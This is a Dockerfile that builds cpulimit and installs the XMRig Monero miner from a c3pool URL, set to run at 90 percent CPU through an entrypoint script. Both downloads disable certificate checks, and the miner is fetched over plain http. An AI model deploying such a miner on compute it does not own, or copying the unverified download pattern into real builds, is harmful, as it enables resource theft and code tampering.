FROM ubuntu:latest

LABEL maintainer="wisdom <wisdom2622069252@gmail.com>"

ENV CPULIMIT_VERSION=0.2 \
    CPU_USAGE=90

RUN apt-get -qq update \
    &&  apt-get -qqy install --no-install-recommends wget \
    &&  apt-get -qqy install --no-install-recommends build-essential \
    &&  cd /root \
    &&  wget --no-check-certificate -c https://github.com/opsengine/cpulimit/archive/v${CPULIMIT_VERSION}.tar.gz \
    &&  tar zxvf v${CPULIMIT_VERSION}.tar.gz \
    &&  cd cpulimit-${CPULIMIT_VERSION} \
    &&  make \
    &&  cp src/cpulimit /usr/bin/ \
    &&  cd /root \
    &&  wget --no-check-certificate -c http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz \
    &&  tar zxvf xmrig.tar.gz \
    &&  chmod 775 xmrig \
    &&  chmod 775 config.json \
    &&  cp xmrig /usr/bin/ \
    &&  mkdir -p /etc/xmrig \
    &&  cp config.json /etc/xmrig \
    &&  cd /root \
    &&  apt-get -qqy remove build-essential  \
    &&  rm v${CPULIMIT_VERSION}.tar.gz \
    &&  rm -rf cpulimit-${CPULIMIT_VERSION} \
    &&  rm -rf /var/lib/apt/lists/*


COPY docker-entrypoint.sh /usr/local/bin/
RUN chmod 775 usr/local/bin/docker-entrypoint.sh  \
    &&  ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat

ENTRYPOINT ["docker-entrypoint.sh"]
